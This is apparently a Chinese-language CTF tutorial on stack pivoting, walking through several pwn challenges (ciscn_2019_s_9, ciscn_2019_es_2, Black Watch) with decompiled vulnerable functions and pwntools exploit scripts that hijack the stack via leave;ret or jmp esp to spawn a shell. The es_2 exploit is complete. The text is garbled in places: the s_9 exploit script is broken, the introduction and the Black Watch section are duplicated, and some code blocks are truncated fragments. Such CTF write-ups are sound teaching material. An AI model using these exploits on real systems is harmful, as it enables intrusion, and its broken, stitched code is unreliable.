栈迁移（stack pivoting），正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting

- 可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链
- 开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。
- 其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用

此外，利用 stack pivoting 有以下几个要求

- 可以控制程序执行流。
- 可以控制 sp 指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是

```plain
pop rsp/esp
```

当然，还会有一些其它的姿势。比如说 `libc_csu_init` 中的 gadgets，我们通过偏移就可以得到控制 `rsp` 指针。上面的是正常的，下面的是偏移的。

此外，还有更加高级的 fake frame。存在可以控制内容的内存，一般有如下

- `bss` 段。由于进程按页分配内存，分配给 `bss` 段的内存大小至少一个页 (4k，`0x1000`) 大小。然而一般 `bss` 段的内容用不了这么多的空间，并且 `bss` 段分配的内存页拥有读写权限。
- `heap`。但是这个需要我们能够泄露堆地址。

一般我们可以把 `bp` 指针的内容覆盖为我们能控制的内存区域，返回地址设置为 `leave`；`ret` 的 `gadget` 就可以实现 `sp` 指针的修改。

## 迁移到栈

### ciscn_2019_s_9

先看保护，32位程序，可以看到存在 RWX 段，猜测栈上可以执行 `shellcode`

![](upload/attach/202602/1002337_AAQ47BCCGUV6KNP.png)

也可以通过 `vmmap` 验证一下

![](upload/attach/202602/1002337_9ZYB8N5VGNHFEZZ.png)

`pwn` 函数通过 `fgets` 写入 `0x32` 个字符，根据 `ida` 写的 `s` 到 `ebp` 的偏移是 `0x20`，因此只能溢出 `0x32-0x20-0x4` 也就是 14 个字节，长度受限。

```python
int pwn()
{
char s[24]; // [esp+8h] [ebp-20h] BYREF
puts("\nHey! ^\_^");
puts("\nIt's nice to meet you");
puts("\nDo you have anything to tell?");
puts(">");
fflush(stdout);
fgets(s, 50, stdin);
puts("OK bye~");
fflush(stdout);
return 1;
}
```

程序还给了一个 `hint` 函数，这个函数里给了一个 `jmp esp` 的 `gadget`，我们可以利用这个 `gadget` 把 `eip` 指到栈上。

```python
void hint()
{
__asm { jmp esp }
}
```

这道题我们可以通过把 `shellcode` 布置到 `s` 数组中，再填充字符直到返回地址，返回地址我们可以覆盖为 `jmp esp` 这个 `gadget` 的地址，这样就可以把 `eip` 指向我们的栈上了，接着我们还需要把 `eip` 指到我们的 `shellcode`，我们可以在返回地址后布置 `"sub esp,0x28;jmp"` 这样一个汇编代码，使得 `eip` 指针指到 `shellcode`，最终拿到 `shell`

```python
payload = shellcode|padding|fake ebp|ret jmp_esp_addr|sub esp,0x28;jmp
```

这里 `shellcode|padding|fake ebp|ret jmp_esp_addr` 刚好占用了 `0x28` 个字节，所以才是 `sub esp,0x28`

#### EXP

```python
from pwn import *
context(arch = 'i386',os = 'linux',log_level = 'debug')
#io = remote("node5.buuoj.cn",25928)

push 0x68732f
push 0x6e69622f

'''
)
jmp_esp = 0x08048554

```

本地调试可以看到，执行 `jmp esp` 后，`eip` 和 `esp` 都指向了我们写的 `sub esp,0x28;jmp esp` 汇编

### ciscn_2019_es_2

先看保护，是 32 位程序。

![](upload/attach/202602/1002337_GTZAM4QCDXSP348.png)

`vul` 里有两个 `read` 操作，但是读入字节为 `0x30` 个字节，根据 `ida` 给出的偏移，我们只能刚好溢出到返回地址，溢出长度受限，需要用到栈迁移

```python
int vul()
{
char s[40]; // [esp+0h] [ebp-28h] BYREF
memset(s, 0, 0x20u);
read(0, s, 0x30u);
printf("Hello, %s\n", s);
read(0, s, 0x30u);
return printf("Hello, %s\n", s);
}
```

程序还有一个 `hack` 函数，执行了 `system` 函数，我们就可以利用 `system@plt` 来调用 `system` 函数了

```python
int hack()
{
return system("echo flag");
}
```

这道题的思路是：通过 `vul` 的第一个 `read` 和 `printf` 函数我们可以泄露 `ebp` 的地址，在第二个 `read` 我们就可以通过栈溢出把 `ebp` 覆盖为变量 `s` 的地址，返回地址覆盖为 `leave_ret` 完成栈迁移，我们只需要在 `s` 数组里布置好 ROP 链即可

#### EXP



```python
from pwn import *
context(arch = 'i386',os = 'linux',log_level = 'debug')
#io=remote("node4.buuoj.cn",25379)
io=process("ciscn_2019_es_2")
#gdb.attach(io,'b *0x080485BE')
elf=ELF("ciscn_2019_es_2")
payload1=b'a'*0x24+b'b'*0x4
#pause()
io.recvuntil(b"\n")
#pause()
io.send(payload1)
#pause()
io.recvuntil(b"bbbb")
ebp_addr=u32(io.recv(4))
log.info(f"ebp_addr:{hex(ebp_addr)}")
leave_ret=0x08048562
sh_addr=ebp_addr-0x38
payload2=b'a'*0x4+p32(elf.plt["system"])+p32(0xdeadbeef)+p32(sh_addr+0x10)+b'/bin/sh'
payload2=payload2.ljust(0x28,b"\x00")
payload2+=p32(sh_addr)+p32(leave_ret)
io.send(payload2)
io.interactive()
```

本地调试，可以看到第一次`read`之后`ebp`相对ROP链的偏移是`0xa8-0x70=0x38`

![](upload/attach/202602/1002337_VPGKHKMZ3UVHCN6.png)

第二次`read`之后，写入ROP链，`ebp`也覆盖为我们的ROP链位置，返回地址的`leave;retn`完成栈迁移

![](upload/attach/202602/1002337_HJMB5SV75PPZQDN.png)

最后就是执行ROP链，执行`system("/bin/sh")`拿到shell了

![](upload/attach/202602/1002337_NNPNAQKWFB67GPA.png)

## [Black Watch 入群题]PWN

先看保护，32位程序。

![](upload/attach/202602/1002337_BPQKAHG3ED3BSM5.png)

再看`vul_function`逻辑，可以看到第一个`read`函数会向`s`变量写入0x200个字节（`s`是一个全局变量，存在`bss`段），第二个`read`会向`buf`写入0x20个字节，根据ida给出的偏移，只能溢出到返回地址，长度受限，但是我们可以将栈迁移到`s`的位置（即把`ebp`覆盖为`s`的地址，返回地址覆盖为`leave_ret`的gadget），因为`s`的内容是可控的，可以布置ROP链

```c
ssize_t vul_function()
{
size_t v0; // eax
size_t v1; // eax
char buf[24]; // [esp+0h] [ebp-18h] BYREF
v0 = strlen(m1);
write(1, m1, v0);
read(0, &s, 0x200u);
v1 = strlen(m2);
write(1, m2, v1);
return read(0, buf, 0x20u);
}
```

解题思路是：将栈迁移到`bss`段，执行ROP链泄露libc基址，之后就是常规的`ret2libc`了

这里借用ctfwiki的介绍：[adfK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0N6r3k6Q4x3X3c8%4K9h3E0A6i4K6u0W2L8%4u0Y4i4K6u0r3M7s2N6F1i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6#2M7$3g2J5i4K6u0V1L8h3!0V1k6g2)9J5c8Y4y4@1j5h3y4C8L8%4k6W2M7X3k6D9L8%4N6Q4x3V1k6^5z5o6k6Q4x3V1k6X3j5h3&6U0P5g2)9J5k6s2u0G2M7q4)9J5c8R3`.`.](https://bbs.kanxue.com/elink@226K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0N6r3k6Q4x3X3c8%4K9h3E0A6i4K6u0W2L8%4u0Y4i4K6u0r3M7s2N6F1i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6#2M7$3g2J5i4K6u0V1L8h3!0V1k6g2)9J5c8Y4y4@1j5h3y4C8L8%4k6W2M7X3k6D9L8%4N6Q4x3V1k6^5z5o6k6Q4x3V1k6X3j5h3&6U0P5g2)9J5k6s2u0G2M7q4)9J5c8R3`.`.) 栈迁移（stack pivoting），正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting

- 可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链

- 开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。

- 其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用

此外，利用 stack pivoting 有以下几个要求

- 可以控制程序执行流。

- 可以控制`sp`指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是

|  |  |
| --- | --- |
| 1 | `pop rsp/esp` |

此外，还有更加高级的 fake frame。存在可以控制内容的内存，一般有如下

- bss 段。由于进程按页分配内存，分配给 bss 段的内存大小至少一个页 (4k，0x1000) 大小。然而一般 bss 段的内容用不了这么多的空间，并且 bss 段分配的内存页拥有读写权限。

- heap。但是这个需要我们能够泄露堆地址。

# 迁移到bss段

## [Black Watch 入群题]PWN

先看保护，32位程序。

![](https://bbs.kanxue.com/upload/attach/202602/1002337_BPQKAHG3ED3BSM5.png)

再看`vul_function`逻辑，可以看到第一个`read`函数会向`s`变量写入`0x200`个字节（`s`是一个全局变量，存在`bss`段），第二个`read`会向`buf`写入`0x20`个字节，根据`ida`给出的偏移，只能溢出到返回地址，长度受限，但是我们可以将栈迁移到`s`的位置（即把`ebp`覆盖为`s`的地址，返回地址覆盖为`leave_ret`的`gadget`），因为`s`的内容是可控的，可以布置`rop`链

{

// eax
size_t v1;
// eax

v1 = strlen(m2);

```

解题思路是：将栈迁移到`bss`段，执行`ROP`链泄露`libc`基址，之后就是常规的`ret2libc`了

payload3=payload3.ljust(0x50,b'a')
payload3+=p64(bss-0x8+0x200)+p64(leave_ret)
io.send(payload3)
io.interactive()
```

这里主要根据打印的`puts`函数地址，计算`libc`在程序中的偏移，再通过`read`函数写入`rop`链，和`payload2`一样，再一次栈迁移

![](https://bbs.kanxue.com/upload/attach/202602/1002337_NTBJCCVCPKBJC2F.png)

看`main`函数可以观察到`malloc`了一个`chunk`，往堆上读入数据，再调用`*v4`这个函数，`v4`是`chunk`的数据部分地址，`*v4`是`chunk`的开始`0x8`个字节的内容，也就是把堆的数据部分的开始`0x8`字节内容当成了函数地址去调用

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
void (**v4)(void); // [rsp+58h] [rbp-8h]

init(argc, argv, envp);
v4 = (void (**)(void))malloc(136LL);
puts("Be a stack hijacking master!");
read(0LL, v4, 128LL);
(*v4)();
return 0;
}
```

看回汇编可以发现`[rbp+var_8]`存储的是`chunk`的数据部分地址，`[rbp+var_10]`存储的是`chunk`的数据部分开始`0x8`字节的内容，`call rdx`也就是`call [rbp+var_10]`
